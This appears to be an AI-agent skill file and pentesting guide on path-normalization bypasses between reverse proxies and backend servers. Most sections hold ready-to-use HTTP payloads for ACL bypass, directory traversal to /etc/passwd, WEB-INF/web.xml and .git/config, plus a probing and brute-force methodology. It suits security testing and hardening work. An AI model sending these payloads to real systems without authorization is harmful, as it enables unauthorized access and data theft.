---
name: path-normalization-bypass
description: Path normalization mismatch testing across reverse proxies, load balancers, and application middleware for ACL bypass, auth bypass, and internal service access
---

# Path Normalization Bypass

Normalization inconsistencies arise when a frontend component (reverse proxy, load balancer, WAF, middleware) evaluates a request path *before* normalizing it, then forwards the raw or partially decoded path to a backend that normalizes differently. The frontend enforces access controls against one path representation; the backend routes against another. The gap between them is the attack surface.

This vulnerability class enables authentication bypass, ACL bypass, access to protected endpoints, SSRF to internal services, and in some stacks, code execution.

## Root Cause

Every HTTP stack along the request path performs some subset of these operations, in its own order:

1. URL decode (`%2e` → `.`, `%2f` → `/`)
2. Collapse repeated slashes (`//` → `/`)
3. Resolve dot segments (`/a/../b` → `/b`, `/a/./b` → `/a/b`)
4. Strip path parameters (`;jsessionid=...`)
5. Normalize separators (Windows `\` → `/`)

When the proxy and the backend differ in *which* of these steps they perform, or in what *order*, an attacker can craft a path that the proxy classifies as harmless and the backend resolves to a protected resource.

## Attack Surface

**Injection Point — The URL Path**

The path is always the primary injection point. Parameters, headers, and body are rarely relevant. Focus entirely on what sits between the method verb and the query string:

```
GET /[INJECTION HERE]?query=x HTTP/1.1
```

**Common Architecture Patterns That Create Risk**

- Nginx or HAProxy in front of Tomcat, WebLogic, Spring Boot, or PHP-FPM
- API gateways (Kong, Traefik, AWS API Gateway) routing to microservices
- CDN or WAF layer (Cloudflare, AWS ALB, Akamai) passing to an origin
- Kubernetes Ingress controllers proxying to pods
- Multi-hop stacks: CDN → nginx → app server → backend API

**Protected Paths to Target**

- `/admin`, `/console`, `/actuator`, `/management`, `/metrics`
- `/api/internal`, `/api/private`, `/debug`, `/health` (with sensitive output)
- Authentication endpoints: `/login`, `/oauth`, `/saml`
- Framework-specific: `/jmx-console`, `/.git`, `/.env`, `/server-status`

## Normalization Behaviors by Component

### Nginx

- Decodes `%XX` sequences then resolves dot segments before matching `location` blocks
- `merge_slashes on` (default) collapses `//` → `/` before matching; `merge_slashes off` disables this and may hide LFI from the proxy while the backend still resolves the path
- Does **not** strip semicolons — `..;/` is forwarded verbatim
- The `$uri` variable contains the decoded, normalized path; `$request_uri` contains the raw, undecoded original — misuse of these variables creates bypass opportunities
- Alias off-by-slash: when `location /static` (no trailing slash) maps to `alias /var/www/static/`, a request for `/static../` escapes the intended root

### Apache httpd

- Decodes and normalizes before `mod_rewrite` and `Location` matching
- Treats `%2f` in path as a literal `/` when `AllowEncodedSlashes On` is set; otherwise returns 400
- `mod_jk` connector had historical issues normalizing before passing to Tomcat workers (CVE-2018-11759)

### Apache Tomcat

- Treats `;` as a path parameter delimiter — everything after `;` up to the next `/` is stripped before routing
- `/..;/` → Tomcat strips `;/`, resolves `..`, performing directory traversal; nginx sees and forwards `..;/` as a literal string
- Accepts both `/` and `\` as path separators on Windows

### HAProxy

- Performs minimal parsing — no URL decode, no dot-segment resolution, no slash collapsing by default
- Forwards nearly raw paths to backends
- Backend sees a fully un-normalized path that may be processed differently

### Traefik

- Evaluates `PathPrefix`, `Path`, and `PathRegexp` router rules **before** decoding the request path
- Forwards the **decoded** path to the backend
- A URL-encoded path (`/report%5Fnote`) bypasses a blocking rule matching `/report_note` but the backend receives `/report_note` and routes normally (Traefik GHSA-gm3x-23wp-hc2c)

### Spring Boot / Java

- `\t` (tab, 0x09) and `;` are interpreted as separators or path parameters in some versions
- Path variables undergo double-decoding in certain framework configurations
- `/admin%3B/` → `;` decoded → `/admin;/` → semicolon stripped → `/admin/`

### Flask (Python/Werkzeug)

- Several non-standard byte values (0x85, 0xA0, 0x1F, 0x1E, 0x1D, 0x1C, 0x0C, 0x0B) are treated as whitespace or path delimiters during normalization, potentially producing a different resolved path than the proxy matched

### AWS Application Load Balancer (ALB)

- Normalizes paths; rejects requests with raw `../` sequences (HTTP 400)
- Does **not** reject `%2e%2e` (percent-encoded dots) — passes them through
- Backend receives the encoded path and may decode and resolve dot segments independently

## Techniques

### 1. Semicolon Injection (Tomcat / Spring)

The proxy normalizes away the dot segment and matches the path; Tomcat strips the semicolon parameter and routes to a different endpoint.

```
# Nginx sees: /allowed/..;/protected → normalizes → /protected → ✗ blocked? 
# No: Nginx sees /allowed/..;/protected, strips nothing, forwards it.
# Tomcat sees /allowed/..;/protected → strips ;/protected → /allowed/.. → resolves → /
# Or targeting a specific path:
GET /public/..;/admin/panel HTTP/1.1
GET /app/..;/..;/WEB-INF/web.xml HTTP/1.1
```

### 2. Percent-Encoded Dot Segments

The proxy matches against the raw `%2e%2e` string (no match for its `/admin` rule); the backend decodes and resolves, yielding `/admin`.

```
GET /public/%2e%2e/admin HTTP/1.1          # %2e = .
GET /public/%2e%2e%2f%2e%2e%2fadmin HTTP/1.1
GET /public/..%2fadmin HTTP/1.1            # encoded slash only
GET /public/%252e%252e/admin HTTP/1.1      # double-encoded (for double-decode stacks)
```

Variations to iterate:

```
%2e%2e/          # single encode, slash raw
%2e%2e%2f        # single encode, slash encoded
%252e%252e%252f  # double encode
..%2f            # dot raw, slash encoded
..%5c            # dot raw, backslash encoded (Windows backends)
%c0%ae%c0%ae%c0%af  # overlong UTF-8
```

### 3. Nginx Off-By-Slash (Alias Traversal)

When `location /static` (no trailing slash) is combined with `alias /var/www/static/` (trailing slash), Nginx strips only the matched prefix `/static` and appends the remainder to the alias path. A request for `/static../` becomes `/var/www/static/../` which resolves one level up.

```
# Config:
# location /static { alias /var/www/static/; }

GET /static../ HTTP/1.1                    # traverse to /var/www/
GET /static../settings/config.py HTTP/1.1  # direct file read
GET /static../app/source.py HTTP/1.1

# Also works with proxy_pass:
# location /api { proxy_pass http://backend/v1/; }
GET /api../ HTTP/1.1                       # backend receives /v1/../ → /
GET /api../internal/secret HTTP/1.1
```

Detection: request `/static../` — a directory listing or unexpected 200 confirms the misconfiguration.

### 4. merge_slashes Off (Multi-Slash Traversal)

When `merge_slashes off` is set in nginx (or the layer in front is an ALB or HAProxy that does not collapse slashes), multiple slashes prevent proxy-level `../` blocking while the backend resolves the traversal.

```
GET /files////../../../../etc/passwd HTTP/1.1
GET /app///..//admin HTTP/1.1
```

The extra slashes survive the proxy, then the backend's dot-segment resolver collapses them and resolves the traversal.

### 5. Fragment / Hash Injection

Nginx and some proxies strip everything after `#` before matching and forwarding. The backend may receive the full original URI including the fragment depending on the proxy implementation.

```
GET /#/../console/ HTTP/1.1
# Nginx strips #/../console/, matches /, proxies /
# WebLogic receives /#/../console/ → resolves → /console/
```

### 6. Traefik Pre-Decode Rule Bypass

Traefik evaluates routing rules before decoding, but forwards decoded paths.

```
# Rule blocks /report_note
GET /report%5Fnote HTTP/1.1      # %5F = _
GET /report%2Fnote HTTP/1.1      # %2F = /  — if rule uses exact match
GET /%61dmin HTTP/1.1            # %61 = a → /admin after decode
```

Test any path character that appears in a blocking rule as its percent-encoded equivalent.

### 7. Case Normalization (Windows Backends)

Case-sensitive proxies enforcing rules against lowercase paths may forward requests to Windows backends that normalize case.

```
GET /Admin HTTP/1.1
GET /ADMIN HTTP/1.1
GET /aDmIn HTTP/1.1
```

### 8. Backslash Separator (Windows / IIS)

IIS and some Java servers treat `\` as a path separator. Proxies on Unix generally do not normalize backslashes.

```
GET /admin\../protected HTTP/1.1
GET /admin%5c../protected HTTP/1.1    # %5c = \
GET /admin%5c%2e%2e%5cprotected HTTP/1.1
```

### 9. Path Parameter Pollution

Inject semicolons to interfere with routing logic without dot traversal.

```
GET /admin;.css HTTP/1.1          # proxy sees *.css (static), backend strips ;.css → /admin
GET /admin;foo=bar HTTP/1.1
GET /;/admin HTTP/1.1             # leading semicolon — some frameworks strip it
```

### 10. Absolute URI / Scheme Injection

Some proxies accept absolute URIs and route on the path component only; the backend may re-parse the full URI differently.

```
GET http://internal-host/admin HTTP/1.1
GET http://backend:8080/internal HTTP/1.1
```

Nginx supports absolute URIs with arbitrary schemes and gives them higher priority than the `Host` header in certain configurations.

### 11. Double Decoding

Stacks that decode twice (e.g., a WAF that decodes then forwards encoded, and a backend that decodes again) allow bypasses via double-encoding.

```
GET /%252e%252e%252fadmin HTTP/1.1   # decoded once: %2e%2e%2fadmin; decoded twice: ../admin
```

### 12. Dot Doubling / Redundant Segments

```
GET /app/./admin HTTP/1.1            # single dot resolves to /app/admin
GET /app/././admin HTTP/1.1
GET /app/....//admin HTTP/1.1        # four dots — some parsers fold pairs
GET /app/%2e/admin HTTP/1.1          # encoded single dot
```

### 13. Unicode / Overlong UTF-8

```
GET /adm%c0%afin HTTP/1.1            # overlong encoding of /
GET /adm%ef%bc%8fin HTTP/1.1         # fullwidth solidus U+FF0F
GET /adm%e2%80%8b%61in HTTP/1.1      # zero-width space + 'a'
```

### 14. Null Byte and Truncation (Legacy Stacks)

```
GET /admin%00.jpg HTTP/1.1           # null byte truncation — PHP < 5.3, older C runtimes
GET /admin%00 HTTP/1.1
```

## Reconnaissance

### Identify the Stack

- Examine `Server:` and `X-Powered-By:` response headers
- Error page fingerprints (Tomcat's stack traces, WebLogic's XML errors, Spring Boot's whitelabel error)
- Response timing and behavior differences between the proxy and direct backend access (if SSRF allows)
- `Via:`, `X-Forwarded-By:`, and `X-Cache:` headers reveal intermediate components

### Map Protected Paths

Before fuzzing, identify what paths the proxy is protecting:

- Crawl the application to find all path prefixes
- Look for `location` blocks via nginx config disclosures (`.git`, backup files)
- Enumerate common admin paths: `/admin`, `/console`, `/actuator/env`, `/server-status`, `/jmx-console`, `/.git/config`
- Check for paths that return 403 from the proxy vs 404 from the backend — 403 indicates proxy-enforced ACL

### Probe Normalization Behavior

Send these baseline probes to understand how the stack normalizes:

```
# Dot resolution
GET /exist/../exist HTTP/1.1         # should return same as /exist

# Encoded dots
GET /exist/%2e%2e/exist HTTP/1.1     # proxy may not resolve; backend may

# Semicolon stripping
GET /exist;test HTTP/1.1             # does it route to /exist?

# Slash collapsing
GET /exist//exist HTTP/1.1           # collapsed or preserved?

# Backslash
GET /exist\exist HTTP/1.1            # treated as separator?
```

Compare status codes and response bodies across these variations to identify which normalizations the proxy performs vs. the backend.

## Controlled Path Reversal Methodology

Controlled path reversal is a systematic probing technique that uses deliberate over-traversal to fingerprint normalization behavior, then narrows depth incrementally to isolate flawed path boundaries. The response code progression across depth variations is the primary signal — not whether traversal "succeeds" outright.

### Phase 1 — Over-Traverse First

Start by requesting more `../` segments than the logical path depth requires. For a target like `/api/v1`, the logical depth is 2, so begin with 4–5 segments of traversal. This over-traversal establishes how the stack handles excessive dot segments.

```
# Target: /api/v1/resource
GET /api/v1/resource/../../../../../ HTTP/1.1       # 5 levels — beyond root
GET /api/v1/resource/../../../../ HTTP/1.1          # 4 levels
GET /api/v1/resource/../../../ HTTP/1.1             # 3 levels — one beyond depth
```

**Interpret the responses:**

| Response | Interpretation |
|----------|---------------|
| `400 Bad Request` | Proxy or WAF is detecting traversal sequences — try encoding variants |
| `500 Internal Server Error` | Backend received the path and failed to handle it — normalization is incomplete or inconsistent; the backend is processing user-controlled path segments |
| `403 Forbidden` | ACL triggered; the proxy or app recognized the traversal and blocked it |
| `200 OK` with unexpected content | Traversal reached a valid resolved path — active normalization flaw |
| `200 OK` with root/index content | All excess `../` were resolved to `/` — stack normalizes but does not block |

A `400` or `500` at this stage is the key signal. It means the backend is receiving and attempting to process a malformed path rather than the proxy absorbing and rejecting it cleanly. This gap — proxy passes it, backend chokes — is where normalization inconsistency lives.

### Phase 2 — Incrementally Reduce Depth

Having observed a `400` or `500` at full over-traversal, reduce the traversal depth one segment at a time and record each status code. The goal is to find the exact depth where the response changes character.

```
# Reduce from 5 → 4 → 3 → 2 → 1
GET /api/v1/resource/../../../../../ HTTP/1.1  → 500
GET /api/v1/resource/../../../../ HTTP/1.1     → 500
GET /api/v1/resource/../../../ HTTP/1.1        → 404   ← response shifts
GET /api/v1/resource/../../ HTTP/1.1           → 404
GET /api/v1/resource/../ HTTP/1.1              → 200
```

**The 500 → 404 transition is the critical signal.** A `404` after a series of `500` or `400` responses means:

- The proxy is now forwarding a path that resolves to a real depth the backend can process (no crash), but the path does not match any registered route
- The backend is normalizing the traversal independently of the proxy
- The resolved path at that depth exists in the routing table but is not the intended endpoint — it is an intermediate or hidden path

A `400`/`500` → `404` transition confirms that the backend is doing its own path resolution, and that the proxy's normalization did not fully sanitize the request before forwarding. The `404`-returning path is now an active attack surface.

### Phase 3 — Pivot to Enumeration at the 404 Path

The `404`-returning traversal path establishes a resolved base. Rather than probing further blindly, treat it as a directory root and invoke directory brute-forcing against it directly.

**Construct the base:**

If `/api/v1/resource/../../` returns a `404`, the backend is resolving this to something like `/api/` or the app root. Use that resolved base as the brute-force target:

```
# Direct brute-force against the resolved base
GET /api/v1/resource/../../[WORDLIST] HTTP/1.1
GET /api/v1/resource/../../admin HTTP/1.1
GET /api/v1/resource/../../internal HTTP/1.1
GET /api/v1/resource/../../config HTTP/1.1
GET /api/v1/resource/../../.env HTTP/1.1
```

This is more targeted than brute-forcing from the app root because the traversal depth is already carrying you past the proxy's access controls. Endpoints discovered via this method may be unreachable through normal paths due to proxy-level ACLs.

**Apply encoding at the pivot point:**

Once a candidate path is found via brute-force, apply the full encoding matrix to confirm the proxy is not independently blocking the path:

```
GET /api/v1/resource/%2e%2e/%2e%2e/admin HTTP/1.1
GET /api/v1/resource/..%2f..%2fadmin HTTP/1.1
GET /api/v1/resource/..;/..;/admin HTTP/1.1       # Tomcat stacks
```

### Phase 4 — Response Comparison Matrix

Maintain a comparison table across all probes. Do not rely on status code alone — compare response body length, Content-Type, Server headers, and response timing. A `404` from the proxy and a `404` from the backend are often structurally different responses.

```
# Proxy-generated 404:
HTTP/1.1 404 Not Found
Server: nginx/1.24.0
Content-Length: 153
<html>... nginx 404 page ...</html>

# Backend-generated 404:
HTTP/1.1 404 Not Found
Server: Apache Tomcat/9.0.65
Content-Length: 1024
<html>... Tomcat 404 page ...</html>
```

If the response origin differs between traversal depths, the proxy is forwarding some depths and blocking others — direct confirmation of a normalization inconsistency at the boundary.

### Summary Decision Tree

```
Over-traverse (n+2 levels)
  ├── 400/403 across all depths → proxy is catching; try encoding variants (Phase 2 of Techniques)
  ├── 500 → backend is processing; reduce depth
  │     ├── 500 holds at all depths → consistent backend failure; test encodings
  │     └── 500 → 404 at some depth → NORMALIZATION FLAW CONFIRMED
  │           └── Pivot: brute-force at that exact traversal depth
  └── 200 at over-traversal → traversal resolves to root; test specific target paths appended
```

### Direct Response

- Receiving a 200 (or application response) for a path that should return 403 from the proxy
- Different response bodies when using encoded vs raw paths against the same logical endpoint

### Error Leakage

- Backend stack traces that expose canonical resolved paths confirm normalization occurred at the backend level
- Framework-specific error pages reveal the resolved route (Spring Boot's whitelabel error shows the path)

### Timing / Behavioral

- Protected endpoints that require authentication return a login redirect; successful bypass returns the actual content
- Response size differences between probe variants

### OAST

- For internal service access: craft a traversal to an SSRF-reachable endpoint that triggers an outbound DNS lookup

## Validation

1. Identify a path that returns **403** from the proxy for the same resource that returns **200** on direct access — establish the baseline
2. Apply a normalization bypass technique and confirm a **200** (or equivalent application response) is returned
3. Use a second, identical proxy-blocked request without the bypass to confirm the 403 is still in force — this eliminates false positives from misconfigured allowlists
4. Record: exact raw request bytes, response status, response body length, and any headers that differ between the bypassed and non-bypassed response
5. Prefer demonstrating access to a static sensitive file (`.git/config`, `WEB-INF/web.xml`, `/actuator/env`) over interactive endpoints to avoid unintentional state changes

## False Positives

- Proxy and backend happen to agree on normalization — no bypass exists despite apparent difference
- Protected path uses a regex match that captures all encoding variants (e.g., `~* "admin"` in nginx matches `/Admin`, `/%61dmin`)
- Backend applies its own ACL independently of the proxy (defense in depth) — bypass reaches the backend but is still blocked
- The 403 is served by the application, not the proxy, and applies the same normalization as the bypass technique

## Impact

- **Authentication / authorization bypass** — access admin panels, internal APIs, and management interfaces without credentials
- **Sensitive file disclosure** — read source code, configuration, credentials, private keys via alias traversal
- **Internal service access** — reach backend services that were assumed protected behind the proxy's routing rules
- **Chaining to RCE** — alias traversal to application source or log files, chained with log poisoning or template injection
- **Security control bypass** — circumvent WAF rules, IP allowlists, and rate limits enforced only at the proxy layer

## Notable CVEs and Research

- **CVE-2018-11759** — Apache mod_jk path normalization inconsistency allowing reverse proxy bypass to Tomcat
- **CVE-2021-41773 / CVE-2021-42013** — Apache httpd path traversal via `%2e` and double-encoding when `mod_cgi` is enabled
- **CVE-2025-0108** — PAN-OS auth bypass via nginx/Apache path confusion; `%2e%2e` decoded by nginx, forwarded to Apache which re-normalized and routed to protected PHP endpoint
- **Traefik GHSA-gm3x-23wp-hc2c** — Pre-decode rule evaluation allows `%XX`-encoded paths to bypass middleware blocking rules
- **Orange Tsai — Breaking Parser Logic (Black Hat 2018)** — foundational research on nginx alias off-by-slash, semicolon injection, and multi-layer normalization gaps

## Pro Tips

1. Always test both `$uri` (normalized) and `$request_uri` (raw) behaviors in nginx — if the app uses `$request_uri` in rewrites or logging, normalization diverges from what you expect
2. When a 403 flips to 200 with one encoding technique, try all other encoding variants systematically — different backend frameworks may only resolve specific encodings
3. Off-by-slash is trivially detectable: send `GET /location-name../` — a 200 with directory listing or unexpected content confirms it immediately
4. On stacks with Tomcat, always try both `..;/` and `;../` — the path parameter stripping order differs across versions
5. Proxy-level ACLs on specific paths (e.g., `/admin`) are far more commonly bypassed than filesystem-level controls — focus effort on path-based access control, not file-level restrictions
6. Use `curl --path-as-is` or Burp's `Disable URL encoding in path` to send raw encoded paths that tools would otherwise normalize before sending
7. Always over-traverse first (n+2 segments beyond logical depth) before testing exact depths — a `500` at excessive depth that transitions to a `404` at reduced depth is the strongest signal of backend-side normalization happening independently of the proxy
8. A `404` returned from the backend (different `Server` header, different body fingerprint) at a depth where the proxy normally returns `403` means the ACL was bypassed entirely — that `404` path is your brute-force entry point
9. When pivoting to enumeration after a confirmed normalization flaw, send the wordlist through the traversal path rather than the root — endpoints found this way may be completely unreachable via normal paths because the proxy blocks direct access but not the traversal route

## Summary

Path normalization bypasses exploit the gap between how a security-enforcing frontend component interprets a URL path and how the backend ultimately routes it. The primary injection point is always the URL path. Enumerate the components in the stack, probe their individual normalization behaviors with benign canaries, then craft encodings that survive proxy matching while resolving to protected paths at the backend. Eliminate the vulnerability at the proxy by normalizing paths to their canonical form before ACL evaluation, not after.
